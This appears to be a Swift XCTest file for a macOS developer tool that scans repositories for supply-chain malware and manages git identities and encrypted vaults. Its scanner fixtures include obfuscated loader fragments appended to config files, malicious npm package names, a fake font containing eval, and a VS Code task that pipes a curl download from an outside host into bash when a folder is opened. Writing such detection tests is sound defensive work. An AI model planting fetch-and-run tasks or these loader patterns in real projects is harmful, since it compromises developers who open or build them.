import XCTest
@testable import Vaultkit

/// Every fixture is a real directory tree, because the scanner's job is file
/// IO: classification by path, byte matching, and change detection.
final class ScannerTests: XCTestCase {
    private var root: String!

    override func setUpWithError() throws {
        root = NSTemporaryDirectory() + "vaultkit-scan-\(UUID().uuidString)"
        try FileManager.default.createDirectory(atPath: root + "/app/.git", withIntermediateDirectories: true)
    }
    override func tearDownWithError() throws {
        try? FileManager.default.removeItem(atPath: root)
    }

    private func write(_ rel: String, _ content: String) throws {
        let path = root + "/" + rel
        try FileManager.default.createDirectory(atPath: (path as NSString).deletingLastPathComponent,
                                                withIntermediateDirectories: true)
        try content.write(toFile: path, atomically: true, encoding: .utf8)
    }

    private var mountedOrg: Organization {
        Organization(name: "acme", displayName: "Acme", gitAuthorName: "A", gitEmail: "a@acme.test",
                     forge: .custom, forgeHost: "", forgeSSHPort: nil, folderPath: root,
                     keyLabel: "ssh-acme", signingEnabled: true, vault: .mounted)
    }

    func testCleanTreeProducesNoFindings() async throws {
        try write("app/postcss.config.mjs", "export default { plugins: {} }\n")
        try write("app/package.json", #"{"dependencies":{"tailwindcss":"^4"}}"#)
        let (report, hits) = await ScannerService().scan(orgs: [mountedOrg])
        XCTAssertTrue(hits.isEmpty)
        XCTAssertEqual(report.reposSeen, 1)
        XCTAssertTrue(report.full)
    }

    func testAppendedLoaderIsFoundInAConfigFile() async throws {
        try write("app/postcss.config.mjs",
                  "export default { plugins: {} }\n\n\n\nglobal['!']='8-270-2';var _$_1e42=(\"rmcej%otb%\",2857687)")
        let (_, hits) = await ScannerService().scan(orgs: [mountedOrg])
        XCTAssertTrue(hits.contains { $0.indicator.contains("original variant") && $0.severity == .critical })
        XCTAssertEqual(hits.first?.repo, "app")
        XCTAssertEqual(hits.first?.path, "app/postcss.config.mjs")
    }

    func testRotatedVariantIsFoundByStructureWithoutTheMarker() async throws {
        try write("app/tailwind.config.js",
                  "module.exports = {}\n\nglobal['_V']='8-st12';function MDy(f){return f}")
        let (_, hits) = await ScannerService().scan(orgs: [mountedOrg])
        XCTAssertTrue(hits.contains { $0.indicator.contains("rotated variant") })
    }

    func testNestedConfigFilesAreNotMissed() async throws {
        try write("app/apps/web/eslint.config.mjs", "export default []\nCot%3t=shtP")
        let (_, hits) = await ScannerService().scan(orgs: [mountedOrg])
        XCTAssertEqual(hits.count, 1)
        XCTAssertEqual(hits.first?.path, "app/apps/web/eslint.config.mjs")
    }

    func testPropagationArtifactsAreFlagged() async throws {
        try write("app/temp_auto_push.bat", "@echo off\n")
        try write("app/.gitignore", "node_modules\nconfig.bat\n")
        let (_, hits) = await ScannerService().scan(orgs: [mountedOrg])
        XCTAssertTrue(hits.contains { $0.indicator.contains("propagation") && $0.severity == .critical })
        XCTAssertTrue(hits.contains { $0.indicator.contains(".gitignore") && $0.severity == .warning })
    }

    func testMaliciousDependencyIsFoundOnlyInDependencySections() async throws {
        try write("app/package.json",
                  #"{"description":"not tailwind-mainanimation","dependencies":{"tailwindcss-style-animate":"^1.1.6"}}"#)
        let (_, hits) = await ScannerService().scan(orgs: [mountedOrg])
        XCTAssertEqual(hits.count, 1)
        XCTAssertEqual(hits.first?.evidence, "tailwindcss-style-animate")
    }

    func testInstalledMaliciousPackageIsFoundWithoutWalkingNodeModules() async throws {
        try write("app/node_modules/tailwind-autoanimation/package.json", "{}")
        try write("app/node_modules/react/index.js", "rmcej%otb%")   // must NOT be read
        let (report, hits) = await ScannerService().scan(orgs: [mountedOrg])
        XCTAssertEqual(hits.count, 1)
        XCTAssertEqual(hits.first?.indicator, "Malicious npm package installed")
        XCTAssertEqual(report.filesScanned, 0, "nothing under node_modules is opened")
    }

    func testTasksJSONC2AndFolderOpenAreFlagged() async throws {
        try write("app/.vscode/tasks.json",
                  #"{"tasks":[{"runOptions":{"runOn":"folderOpen"},"command":"curl -s https://default-configuration.vercel.app/settings/mac | bash"}]}"#)
        let (_, hits) = await ScannerService().scan(orgs: [mountedOrg])
        XCTAssertTrue(hits.contains { $0.indicator.contains("bootstrap host") && $0.severity == .critical })
    }

    func testFakeFontIsDetectedByMagicAlone() async throws {
        try write("app/public/fonts/fa-solid-400.woff2", "global['r'] = require; eval(x)")
        let (_, hits) = await ScannerService().scan(orgs: [mountedOrg])
        XCTAssertTrue(hits.contains { $0.indicator.contains("font") && $0.severity == .critical })
    }

    func testRealFontIsLeftAlone() async throws {
        let path = root + "/app/public/a.woff2"
        try FileManager.default.createDirectory(atPath: root + "/app/public", withIntermediateDirectories: true)
        try Data("wOF2".utf8 + [0, 0, 0, 0]).write(to: URL(fileURLWithPath: path))
        let (_, hits) = await ScannerService().scan(orgs: [mountedOrg])
        XCTAssertTrue(hits.isEmpty)
    }

    /// The second pass reads only what changed; a finding survives it untouched
    /// and a cleaned file's finding disappears.
    func testIncrementalPassRereadsOnlyChangedFiles() async throws {
        try write("app/postcss.config.mjs", "export default {}\nrmcej%otb%")
        try write("app/next.config.mjs", "export default {}\n")
        let scanner = ScannerService()
        let (first, hits1) = await scanner.scan(orgs: [mountedOrg])
        XCTAssertEqual(first.filesScanned, 2)
        XCTAssertEqual(hits1.count, 1)

        let (second, hits2) = await scanner.scan(orgs: [mountedOrg])
        XCTAssertEqual(second.filesScanned, 0, "nothing changed, nothing re-read")
        XCTAssertEqual(hits2.count, 1, "the earlier finding is kept")
        XCTAssertFalse(second.full)

        try await Task.sleep(nanoseconds: 50_000_000)
        try write("app/postcss.config.mjs", "export default {}\n")   // cleaned
        let (third, hits3) = await scanner.scan(orgs: [mountedOrg])
        XCTAssertEqual(third.filesScanned, 1)
        XCTAssertTrue(hits3.isEmpty)
    }

    /// Ejecting a vault takes its findings with it, and a remount gets a full
    /// pass rather than a diff against a baseline the volume never saw.
    func testEjectedVaultDropsFindingsAndBaseline() async throws {
        try write("app/postcss.config.mjs", "export default {}\nrmcej%otb%")
        let scanner = ScannerService()
        _ = await scanner.scan(orgs: [mountedOrg])
        var locked = mountedOrg; locked.vault = .locked
        let (_, hitsLocked) = await scanner.scan(orgs: [locked])
        XCTAssertTrue(hitsLocked.isEmpty)
        let (again, hitsAgain) = await scanner.scan(orgs: [mountedOrg])
        XCTAssertTrue(again.full)
        XCTAssertEqual(hitsAgain.count, 1)
    }

    func testDeepScanWidensToSourceFiles() async throws {
        try write("app/src/lib/helper.ts", "// TXfxHUet9pJVU1BgVkBAbrES4YUc1nGzcG")
        let scanner = ScannerService()
        let (_, quick) = await scanner.scan(orgs: [mountedOrg])
        XCTAssertTrue(quick.isEmpty, "a quick pass stays on the targeted file names")
        let (_, deep) = await scanner.scan(orgs: [mountedOrg], deep: true)
        XCTAssertEqual(deep.count, 1)
    }
}

final class OrgRemovalTests: XCTestCase {

    func testOnlyTheOrgIncludesAreStripped() {
        let config = """
        [user]
        \tuseConfigOnly = true

        [includeIf "gitdir:~/work/acme/"]
        \tpath = ~/.gitconfig-acme
        [includeIf "gitdir:~/work/globex/"]
        \tpath = ~/.gitconfig-globex
        # fallback: vaults mounted via Finder land at /Volumes/<name>
        [includeIf "gitdir:/Volumes/Acme/"]
        \tpath = ~/.gitconfig-acme

        [gpg]
        \tformat = ssh
        """
        let out = GitConfigService.strippingIncludes(pointingTo: "~/.gitconfig-acme", from: config)
        XCTAssertFalse(out.contains("gitconfig-acme"))
        XCTAssertTrue(out.contains("gitdir:~/work/globex/"), "other orgs untouched")
        XCTAssertTrue(out.contains("# fallback:"), "comments preserved")
        XCTAssertTrue(out.contains("[gpg]\n\tformat = ssh"), "unrelated sections byte-identical")
    }

    func testRemovalDeletesThePerOrgFileAndLeavesTheRest() throws {
        let home = NSTemporaryDirectory() + "vaultkit-home-\(UUID().uuidString)"
        try FileManager.default.createDirectory(atPath: home, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(atPath: home) }
        try "[includeIf \"gitdir:~/work/acme/\"]\n\tpath = ~/.gitconfig-acme\n[core]\n\tpager = less\n"
            .write(toFile: home + "/.gitconfig", atomically: true, encoding: .utf8)
        try "[user]\n\tname = A\n".write(toFile: home + "/.gitconfig-acme", atomically: true, encoding: .utf8)

        let org = Organization(name: "acme", displayName: "Acme", gitAuthorName: "A", gitEmail: "a@x",
                               forge: .custom, forgeHost: "", forgeSSHPort: nil, folderPath: "~/work/acme",
                               keyLabel: "ssh-acme", signingEnabled: true, vault: .none)
        try GitConfigService(home: home).removeOrganization(org)

        XCTAssertFalse(FileManager.default.fileExists(atPath: home + "/.gitconfig-acme"))
        let rest = try String(contentsOfFile: home + "/.gitconfig", encoding: .utf8)
        XCTAssertEqual(rest, "[core]\n\tpager = less\n")
    }

    func testIdentityHashIsResolvedFromTheLabel() async {
        let runner = FakeRunner()
        runner.responses = [("list-ctk-identities", CommandResult(status: 0, stdout: """
        Key Type Public Key Hash                          Prot Label    Common Name
        p-256-ne AAAA1111 bio  ssh-acme ssh-acme
        p-256-ne BBBB2222 bio  ssh-globex ssh-globex
        """, stderr: ""))]
        let hash = await EnclaveKeyService(runner: runner).identityHash(label: "ssh-globex")
        XCTAssertEqual(hash, "BBBB2222")
    }

    /// diskutil can exit 0 without doing anything; the volume list is the truth.
    func testDeleteVaultIsOnlyBelievedWhenTheVolumeIsGone() async {
        let runner = FakeRunner()
        runner.responses = [("apfs list", FakeRunner.plist(name: "Acme", locked: true, mountPoint: nil))]
        let service = DiskUtilVaultService(runner: runner, mountTable: { [:] })
        let org = Organization(name: "acme", displayName: "Acme", gitAuthorName: "A", gitEmail: "a@x",
                               forge: .custom, forgeHost: "", forgeSSHPort: nil, folderPath: "~/work/acme",
                               keyLabel: "ssh-acme", signingEnabled: true, vault: .locked)
        do {
            try await service.deleteVault(for: org)
            XCTFail("a volume that is still listed must not count as deleted")
        } catch {
            XCTAssertTrue(runner.calls.contains { $0.contains("deleteVolume") })
        }
    }

    func testDeleteVaultRefusesWhileMounted() async {
        let runner = FakeRunner()
        runner.responses = [("apfs list", FakeRunner.plist(name: "Acme", locked: false, mountPoint: "/Volumes/Acme"))]
        let service = DiskUtilVaultService(runner: runner, mountTable: { [:] })
        let org = Organization(name: "acme", displayName: "Acme", gitAuthorName: "A", gitEmail: "a@x",
                               forge: .custom, forgeHost: "", forgeSSHPort: nil, folderPath: "~/work/acme",
                               keyLabel: "ssh-acme", signingEnabled: true, vault: .misplaced)
        _ = try? await service.deleteVault(for: org)
        XCTAssertFalse(runner.calls.contains { $0.contains("deleteVolume") }, "never delete a live mount")
    }
}
